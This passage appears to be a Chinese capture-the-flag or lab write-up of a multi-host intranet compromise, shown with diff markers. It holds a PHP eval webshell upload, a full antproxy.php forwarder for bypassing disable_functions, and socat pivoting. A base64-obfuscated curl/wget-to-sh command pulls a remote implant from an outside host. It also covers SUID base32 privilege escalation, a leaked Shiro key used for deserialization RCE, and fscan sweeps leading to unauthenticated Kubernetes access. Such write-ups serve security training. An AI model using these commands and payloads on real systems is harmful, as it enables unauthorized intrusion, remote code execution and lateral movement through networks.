+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@portal:/tmp/OAsystem$ <span class="pl-c1">echo</span> <span class="pl-c1">test</span> <span class="pl-k">|</span> base64
+dGVzdAo=
+www-data@portal:/tmp/OAsystem$ curl -X POST -d <span class="pl-s"><span class="pl-pds">'</span>imgbase64=data:image/png;base64,dGVzdAo=<span class="pl-pds">'</span></span> http://172.28.23.26
+/uploadbase64.php
+{<span class="pl-s"><span class="pl-pds">"</span>src<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>upload/2025-12-18-69439d03999bd.png<span class="pl-pds">"</span></span>}www-www-data@portal:/tmp/OAsystem$ curl http://172.28.23.26/upload/2025-12-18-69439d03999bd.png
+<span class="pl-c1">test</span></pre></div>
+<p>没检测后缀传个eval马拿下信息，看看disable_function</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl <span class="pl-s"><span class="pl-pds">'</span>http://172.28.23.26/upload/2025-12-18-69439f1adcb82.php<span class="pl-pds">'</span></span> -X POST -d <span class="pl-s"><span class="pl-pds">'</span>1=phpinfo();<span class="pl-pds">'</span></span> <span class="pl-k">|</span> grep disable_function</pre></div>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl&lt;/td&gt;&lt;td class="v"&gt;pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl</pre></div>
+<p>全禁完了，大概率<strong>LD_PRELOAD</strong>了，原理可以看<a href="https://the0n3.top/pages/disfunc/" rel="nofollow">webshell绕过disable_functions | the0n3</a></p>
+<p>这个是内网，所以蚁剑走个外网主机的代理去内网访问即可</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@portal:/tmp/OAsystem$ ./socat TCP-LISTEN:10001,fork TCP:172.28.23.26:80 <span class="pl-k">&amp;</span>
+[1] 4300</pre></div>
+<p>绕过LD_PRELOAD后，蚁剑会在upload下生产.antproxy.php文件，</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+<span class="pl-k">function</span> <span class="pl-en">get_client_header</span>(){
+    <span class="pl-s1"><span class="pl-c1">$</span>headers</span>=<span class="pl-en">array</span>();
+    <span class="pl-k">foreach</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span> <span class="pl-k">as</span> <span class="pl-s1"><span class="pl-c1">$</span>k</span>=&gt;<span class="pl-s1"><span class="pl-c1">$</span>v</span>){
+        <span class="pl-k">if</span>(<span class="pl-en">strpos</span>(<span class="pl-s1"><span class="pl-c1">$</span>k</span>,<span class="pl-s">'<span class="pl-s">HTTP_</span>'</span>)===<span class="pl-c1">0</span>){
+            <span class="pl-s1"><span class="pl-c1">$</span>k</span>=<span class="pl-en">strtolower</span>(<span class="pl-en">preg_replace</span>(<span class="pl-s">'<span class="pl-s">/^HTTP/</span>'</span>, <span class="pl-s">''</span>, <span class="pl-s1"><span class="pl-c1">$</span>k</span>));
+            <span class="pl-s1"><span class="pl-c1">$</span>k</span>=<span class="pl-en">preg_replace_callback</span>(<span class="pl-s">'<span class="pl-s">/_\w/</span>'</span>,<span class="pl-s">'<span class="pl-s">header_callback</span>'</span>,<span class="pl-s1"><span class="pl-c1">$</span>k</span>);
+            <span class="pl-s1"><span class="pl-c1">$</span>k</span>=<span class="pl-en">preg_replace</span>(<span class="pl-s">'<span class="pl-s">/^_/</span>'</span>,<span class="pl-s">''</span>,<span class="pl-s1"><span class="pl-c1">$</span>k</span>);
+            <span class="pl-s1"><span class="pl-c1">$</span>k</span>=<span class="pl-en">str_replace</span>(<span class="pl-s">'<span class="pl-s">_</span>'</span>,<span class="pl-s">'<span class="pl-s">-</span>'</span>,<span class="pl-s1"><span class="pl-c1">$</span>k</span>);
+            <span class="pl-k">if</span>(<span class="pl-s1"><span class="pl-c1">$</span>k</span>==<span class="pl-s">'<span class="pl-s">Host</span>'</span>) <span class="pl-k">continue</span>;
+            <span class="pl-s1"><span class="pl-c1">$</span>headers</span>[]=<span class="pl-s">"<span class="pl-s1"><span class="pl-c1">$</span>k</span><span class="pl-s">:</span><span class="pl-s1"><span class="pl-c1">$</span>v</span>"</span>;
+        }
+    }
+    <span class="pl-k">return</span> <span class="pl-s1"><span class="pl-c1">$</span>headers</span>;
+}
+<span class="pl-k">function</span> <span class="pl-en">header_callback</span>(<span class="pl-s1"><span class="pl-c1">$</span>str</span>){
+    <span class="pl-k">return</span> <span class="pl-en">strtoupper</span>(<span class="pl-s1"><span class="pl-c1">$</span>str</span>[<span class="pl-c1">0</span>]);
+}
+<span class="pl-k">function</span> <span class="pl-en">parseHeader</span>(<span class="pl-s1"><span class="pl-c1">$</span>sResponse</span>){
+    <span class="pl-en">list</span>(<span class="pl-s1"><span class="pl-c1">$</span>headerstr</span>,<span class="pl-s1"><span class="pl-c1">$</span>sResponse</span>)=<span class="pl-en">explode</span>(<span class="pl-s">"<span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s"></span>"</span>,<span class="pl-s1"><span class="pl-c1">$</span>sResponse</span>, <span class="pl-c1">2</span>);
+    <span class="pl-s1"><span class="pl-c1">$</span>ret</span>=<span class="pl-en">array</span>(<span class="pl-s1"><span class="pl-c1">$</span>headerstr</span>,<span class="pl-s1"><span class="pl-c1">$</span>sResponse</span>);
+    <span class="pl-k">if</span>(<span class="pl-en">preg_match</span>(<span class="pl-s">'<span class="pl-s">/^HTTP/1.1 d{3}/</span>'</span>, <span class="pl-s1"><span class="pl-c1">$</span>sResponse</span>)){
+        <span class="pl-s1"><span class="pl-c1">$</span>ret</span>=<span class="pl-en">parseHeader</span>(<span class="pl-s1"><span class="pl-c1">$</span>sResponse</span>);
+    }
+    <span class="pl-k">return</span> <span class="pl-s1"><span class="pl-c1">$</span>ret</span>;
+}
+
+<span class="pl-en">set_time_limit</span>(<span class="pl-c1">120</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>headers</span>=<span class="pl-en">get_client_header</span>();
+<span class="pl-s1"><span class="pl-c1">$</span>host</span> = <span class="pl-s">"<span class="pl-s">127.0.0.1</span>"</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>port</span> = <span class="pl-c1">61212</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>errno</span> = <span class="pl-s">''</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>errstr</span> = <span class="pl-s">''</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>timeout</span> = <span class="pl-c1">30</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>url</span> = <span class="pl-s">"<span class="pl-s">/2025-12-18-69439f1adcb82.php</span>"</span>;
+
+<span class="pl-k">if</span> (!<span class="pl-en">empty</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span>[<span class="pl-s">'<span class="pl-s">QUERY_STRING</span>'</span>])){
+    <span class="pl-s1"><span class="pl-c1">$</span>url</span> .= <span class="pl-s">"<span class="pl-s">?</span>"</span>.<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span>[<span class="pl-s">'<span class="pl-s">QUERY_STRING</span>'</span>];
+};
+
+<span class="pl-s1"><span class="pl-c1">$</span>fp</span> = <span class="pl-en">fsockopen</span>(<span class="pl-s1"><span class="pl-c1">$</span>host</span>, <span class="pl-s1"><span class="pl-c1">$</span>port</span>, <span class="pl-s1"><span class="pl-c1">$</span>errno</span>, <span class="pl-s1"><span class="pl-c1">$</span>errstr</span>, <span class="pl-s1"><span class="pl-c1">$</span>timeout</span>);
+<span class="pl-k">if</span>(!<span class="pl-s1"><span class="pl-c1">$</span>fp</span>){
+    <span class="pl-k">return</span> <span class="pl-c1">false</span>;
+}
+
+<span class="pl-s1"><span class="pl-c1">$</span>method</span> = <span class="pl-s">"<span class="pl-s">GET</span>"</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>post_data</span> = <span class="pl-s">""</span>;
+<span class="pl-k">if</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span>[<span class="pl-s">'<span class="pl-s">REQUEST_METHOD</span>'</span>]==<span class="pl-s">'<span class="pl-s">POST</span>'</span>) {
+    <span class="pl-s1"><span class="pl-c1">$</span>method</span> = <span class="pl-s">"<span class="pl-s">POST</span>"</span>;
+    <span class="pl-s1"><span class="pl-c1">$</span>post_data</span> = <span class="pl-en">file_get_contents</span>(<span class="pl-s">'<span class="pl-s">php://input</span>'</span>);
+}
+
+<span class="pl-s1"><span class="pl-c1">$</span>out</span> = <span class="pl-s1"><span class="pl-c1">$</span>method</span>.<span class="pl-s">"<span class="pl-s"> </span>"</span>.<span class="pl-s1"><span class="pl-c1">$</span>url</span>.<span class="pl-s">"<span class="pl-s"> HTTP/1.1</span>\r\n"</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>out</span> .= <span class="pl-s">"<span class="pl-s">Host: </span>"</span>.<span class="pl-s1"><span class="pl-c1">$</span>host</span>.<span class="pl-s">"<span class="pl-s">:</span>"</span>.<span class="pl-s1"><span class="pl-c1">$</span>port</span>.<span class="pl-s">"\r\n"</span>;
+<span class="pl-k">if</span> (!<span class="pl-en">empty</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span>[<span class="pl-s">'<span class="pl-s">CONTENT_TYPE</span>'</span>])) {
+    <span class="pl-s1"><span class="pl-c1">$</span>out</span> .= <span class="pl-s">"<span class="pl-s">Content-Type: </span>"</span>.<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span>[<span class="pl-s">'<span class="pl-s">CONTENT_TYPE</span>'</span>].<span class="pl-s">"\r\n"</span>;
+}
+<span class="pl-s1"><span class="pl-c1">$</span>out</span> .= <span class="pl-s">"<span class="pl-s">Content-length:</span>"</span>.<span class="pl-en">strlen</span>(<span class="pl-s1"><span class="pl-c1">$</span>post_data</span>).<span class="pl-s">"\r\n"</span>;
+
+<span class="pl-s1"><span class="pl-c1">$</span>out</span> .= <span class="pl-en">implode</span>(<span class="pl-s">"\r\n"</span>,<span class="pl-s1"><span class="pl-c1">$</span>headers</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>out</span> .= <span class="pl-s">"\r\n\r\n"</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>out</span> .= <span class="pl-s">""</span>.<span class="pl-s1"><span class="pl-c1">$</span>post_data</span>;
+
+<span class="pl-en">fputs</span>(<span class="pl-s1"><span class="pl-c1">$</span>fp</span>, <span class="pl-s1"><span class="pl-c1">$</span>out</span>);
+
+<span class="pl-s1"><span class="pl-c1">$</span>response</span> = <span class="pl-s">''</span>;
+<span class="pl-k">while</span>(<span class="pl-s1"><span class="pl-c1">$</span>row</span>=<span class="pl-en">fread</span>(<span class="pl-s1"><span class="pl-c1">$</span>fp</span>, <span class="pl-c1">4096</span>)){
+    <span class="pl-s1"><span class="pl-c1">$</span>response</span> .= <span class="pl-s1"><span class="pl-c1">$</span>row</span>;
+}
+<span class="pl-en">fclose</span>(<span class="pl-s1"><span class="pl-c1">$</span>fp</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>pos</span> = <span class="pl-en">strpos</span>(<span class="pl-s1"><span class="pl-c1">$</span>response</span>, <span class="pl-s">"\r\n\r\n"</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>response</span> = <span class="pl-en">substr</span>(<span class="pl-s1"><span class="pl-c1">$</span>response</span>, <span class="pl-s1"><span class="pl-c1">$</span>pos</span>+<span class="pl-c1">4</span>);
+<span class="pl-k">echo</span> <span class="pl-s1"><span class="pl-c1">$</span>response</span>;</pre></div>
+<p>其中重要的是<code class="notranslate">$url = "/2025-12-18-69439f1adcb82.php";</code>字段<br>
+他去web根下找这个php文件，包找不到的，所以改成upload下，不过改了之后仍然不行，也是很神奇，有点神奇</p>
+<p>最终方法是在web根下传了个system的get马，antproxy指过去<code class="notranslate">$url = "/shell.php";</code>不过蚁剑还是连不上实在没明白，但是直接curl antproxy可以执行命令</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@portal:/tmp/OAsystem$ curl <span class="pl-s"><span class="pl-pds">'</span>http://172.28.23.26/upload/.antproxy.php?cmd=ls<span class="pl-pds">'</span></span>
+Api
+Classes
+checklogin.php
+db.php
+db_oasystem.sql
+download
+fn.php
+index.php
+main.php
+manage
+nginx.htaccess
+oa4.png
+shell.php
+sqlbackup
+static
+system
+upfile.php
+upload
+upload.php
+uploadbase64.php
+uploadimage
+usertab.php
+ver.php</pre></div>
+<p>在外网主机做socat代理把10002端口流量转发到服务器上，上线vshell即可</p>
+<pre class="notranslate"><code class="notranslate">www-data@portal:/tmp$ ./socat TCP4-LISTEN:10002,reuseaddr,fork TCP4:ip:port &amp;
+[2] 4514
+www-data@portal:/tmp$ curl 'http://172.28.23.26/upload/.antproxy.php?cmd=echo+KGN1cmwgLWZzU0wgLW0xODAgaHR0cDovLzE3Mi4yOC4yMy4xNzoxMDAwMi9zbHR8fHdnZXQgLVQxODAgLXEgaHR0cDovLzE3Mi4yOC4yMy4xNzoxMDAwMi9zbHQpfHNo+|base64+-d|bash'
+</code></pre>
+<h3>flag2</h3>
+<p>根下需要root才能读flag2</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@ubuntu-oa:/tmp$ find / -perm -4000 <span class="pl-k">2&gt;</span>/dev/null
+/bin/fusermount
+/bin/ping6
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/staprun
+/usr/bin/base32
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/s-nail/s-nail-privsep</pre></div>
+<p>可以看到有base32，读完解码即可</p>
+<h2>172.28.23.33/172.22.10.16</h2>
+<h3>web</h3>
+<p>同样走代理<br>
+heapdump拿下来，分析一手可以得到，shiro框架</p>
+<pre class="notranslate"><code class="notranslate">CookieRememberMeManager(ShiroKey)
+-------------
+algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES
+</code></pre>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0aad6aa1-7825-4994-8588-8eb303c7eab5"><img width="2000" height="1295" alt="Image" src="https://github.com/user-attachments/assets/0aad6aa1-7825-4994-8588-8eb303c7eab5" style="max-width: 100%; height: auto; max-height: 1295px;"></a></p>
+<p>直接一把梭了，<a href="https://github.com/SummerSec/ShiroAttack2">SummerSec/ShiroAttack2: shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马）修复原版中NoCC的问题 https://github.com/j1anFen/shiro_attack</a></p>
+<p>继续上线vshell</p>
+<p>还开了个59696端口，同时发现新的内网段</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ops01@ubuntu-erp:<span class="pl-k">~</span>$ file HashNote 
+HashNote: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1a23e8dbc5918602e6a0994df9b044d92ba96c87, <span class="pl-k">for</span> GNU/Linux 3.2.0, stripped
+ops01@ubuntu-erp:<span class="pl-k">~</span>$ ss -lnt
+State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           Process           
+LISTEN           0                4096                        127.0.0.53%lo:53                               0.0.0.0:<span class="pl-k">*</span>                                
+LISTEN           0                128                               0.0.0.0:22                               0.0.0.0:<span class="pl-k">*</span>                                
+LISTEN           0                64                                0.0.0.0:59696                            0.0.0.0:<span class="pl-k">*</span>                                
+LISTEN           0                100                                     <span class="pl-k">*</span>:8080                                   <span class="pl-k">*</span>:<span class="pl-k">*</span>    </pre></div>
+<p>很多方法没找到具体pid，不过大概也可以猜到就是这个elf了，交给队友拷打了，继续内网</p>
+<h3>flag3</h3>
+<p>在root下</p>
+<h1>内网横向(第二层)</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@ubuntu-oa:/tmp$ ip a
+1: lo: <span class="pl-k">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:70 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:970/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:08:f6 brd ff:ff:ff:ff:ff:ff
+    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:8f6/64 scope link 
+       valid_lft forever preferred_lft forever
+       
+ops01@ubuntu-erp:<span class="pl-k">~</span>$ ip a
+1: lo: <span class="pl-k">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:55 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0
+       valid_lft 1892152665sec preferred_lft 1892152665sec
+    inet6 fe80::216:3eff:fe05:955/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:59 brd ff:ff:ff:ff:ff:ff
+    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:959/64 scope link 
+       valid_lft forever preferred_lft forever</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ops01@ubuntu-erp:/tmp/test$ ./fscan -h 172.22.10.16/24
+
+   ___                              _    
+  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __ 
+ / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
+<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span>
+<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span>
+<span class="pl-s">                     fscan version: 1.8.4</span>
+<span class="pl-s">start infoscan</span>
+<span class="pl-s">trying RunIcmp2</span>
+<span class="pl-s">The current user permissions unable to send icmp packets</span>
+<span class="pl-s">start ping</span>
+<span class="pl-s">(icmp) Target 172.22.10.28    is alive</span>
+<span class="pl-s">(icmp) Target 172.22.10.16    is alive</span>
+<span class="pl-s">[*] Icmp alive hosts len is: 2</span>
+<span class="pl-s">172.22.10.28:3306 open</span>
+<span class="pl-s">172.22.10.28:80 open</span>
+<span class="pl-s">172.22.10.28:22 open</span>
+<span class="pl-s">[*] alive ports len is: 5</span>
+<span class="pl-s">start vulscan</span>
+<span class="pl-s">[*] WebTitle http://172.22.10.28       code:200 len:1975   title:DooTask</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span>
+<span class="pl-s"></span>
+<span class="pl-s">www-data@ubuntu-oa:/tmp/test$ ./fscan -h 172.22.14.6/24</span>
+<span class="pl-s"></span>
+<span class="pl-s">   ___                              _    </span>
+<span class="pl-s">  / _ \     ___  ___ _ __ __ _  ___| | __ </span>
+<span class="pl-s"> / /_\/____/ __|/ __| <span class="pl-pds">'</span></span>__/ _<span class="pl-s"><span class="pl-pds">`</span> <span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-k">|</span>/ /</span>
+<span class="pl-s">/ /_<span class="pl-cce">\\</span>_____<span class="pl-cce">\_</span>_ <span class="pl-cce">\ </span>(__<span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> (_<span class="pl-k">|</span> <span class="pl-k">|</span> (__<span class="pl-k">|</span>   <span class="pl-k">&lt;</span>    </span>
+<span class="pl-s"><span class="pl-cce">\_</span>___/     <span class="pl-k">|</span>___/<span class="pl-cce">\_</span>__<span class="pl-k">|</span>_<span class="pl-k">|</span>  <span class="pl-cce">\_</span>_,_<span class="pl-k">|</span><span class="pl-cce">\_</span>__<span class="pl-k">|</span>_<span class="pl-k">|</span><span class="pl-cce">\_\ </span>  </span>
+<span class="pl-s">                     fscan version: 1.8.4</span>
+<span class="pl-s">start infoscan</span>
+<span class="pl-s">trying RunIcmp2</span>
+<span class="pl-s">The current user permissions unable to send icmp packets</span>
+<span class="pl-s">start ping</span>
+<span class="pl-s">(icmp) Target 172.22.14.37    is alive</span>
+<span class="pl-s">(icmp) Target 172.22.14.46    is alive</span>
+<span class="pl-s">(icmp) Target 172.22.14.6     is alive</span>
+<span class="pl-s">[<span class="pl-k">*</span>] Icmp alive hosts len is: 3</span>
+<span class="pl-s">172.22.14.46:80 open</span>
+<span class="pl-s">172.22.14.46:22 open</span>
+<span class="pl-s">172.22.14.37:22 open</span>
+<span class="pl-s">172.22.14.37:10250 open</span>
+<span class="pl-s">172.22.14.37:2379 open</span>
+<span class="pl-s">[<span class="pl-k">*</span>] alive ports len is: 8</span>
+<span class="pl-s">start vulscan</span>
+<span class="pl-s">[<span class="pl-k">*</span>] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor</span>
+<span class="pl-s">[+] InfoScan http://172.22.14.46       [Harbor] </span>
+<span class="pl-s">[<span class="pl-k">*</span>] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None</span>
+<span class="pl-s">[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]</span></pre></div>
+<p>有个主机<strong>172.22.10.28</strong>，开放ssh，mysql，web，还有两台<strong>172.22.14.37</strong>这台主机开放了22，10250端口和2379端口</p>
+<p>10250端口是Kubelet 的默认监听端口，用于与 API Server 通信，管理节点和容器的状态。<br>
+2379端口是 etcd服务的默认Client API监听端口，主要用于 Kubernetes 等系统中组件与 etcd 进行数据交互。</p>
+<p>这两个端口都强烈暗示37这台主机也开放了kubelet服务</p>
+<p><strong>172.22.14.46</strong>开放了22和80端口，80端口是harbor</p>
+<h2>172.22.14.37-k8s</h2>
+<p>对<strong>172.22.14.37</strong>进行全端口扫描</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@ubuntu-oa:/tmp/test$ ./fscan -h 172.22.14.37 -p 1-65535
+
+   ___                              _    
+  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __ 
+ / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
+<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span>
+<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span>
+<span class="pl-s">                     fscan version: 1.8.4</span>
+<span class="pl-s">start infoscan</span>
+<span class="pl-s">172.22.14.37:22 open</span>
+<span class="pl-s">172.22.14.37:2379 open</span>
+<span class="pl-s">172.22.14.37:2380 open</span>
+<span class="pl-s">172.22.14.37:6443 open</span>
+<span class="pl-s">172.22.14.37:10251 open</span>
+<span class="pl-s">172.22.14.37:10252 open</span>
+<span class="pl-s">172.22.14.37:10256 open</span>
+<span class="pl-s">172.22.14.37:10250 open</span>
+<span class="pl-s">[*] alive ports len is: 8</span>
+<span class="pl-s">start vulscan</span>
+<span class="pl-s">[*] WebTitle http://172.22.14.37:10252 code:404 len:19     title:None</span>
+<span class="pl-s">[*] WebTitle http://172.22.14.37:10251 code:404 len:19     title:None</span>
+<span class="pl-s">[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None</span>
+<span class="pl-s">[*] WebTitle http://172.22.14.37:10256 code:404 len:19     title:None</span>
+<span class="pl-s">[*] WebTitle https://172.22.14.37:6443 code:200 len:4671   title:None</span>
+<span class="pl-s">[+] PocScan https://172.22.14.37:6443 poc-yaml-go-pprof-leak </span>
+<span class="pl-s">[+] PocScan https://172.22.14.37:6443 poc-yaml-kubernetes-unauth </span></pre></div>
+<p>poc扫描发现存在kubernets未授权</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@VM-8-5-ubuntu:/tmp/test# proxychains4 curl https://172.22.14.37:6443 -k
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:10002  ...  172.22.14.37:6443  ...  OK
+{
+  <span class="pl-s"><span class="pl-pds">"</span>paths<span class="pl-pds">"</span></span>: [
+    <span class="pl-s"><span class="pl-pds">"</span>/api<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/api/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/admissionregistration.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/admissionregistration.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/admissionregistration.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/apiextensions.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/apiextensions.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/apiextensions.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/apiregistration.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/apiregistration.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/apiregistration.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/apps<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/apps/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/authentication.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/authentication.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/authentication.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/authorization.k8s.io<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/authorization.k8s.io/v1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/authorization.k8s.io/v1beta1<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>/apis/autoscaling<span class="pl-pds">"</span></span>,
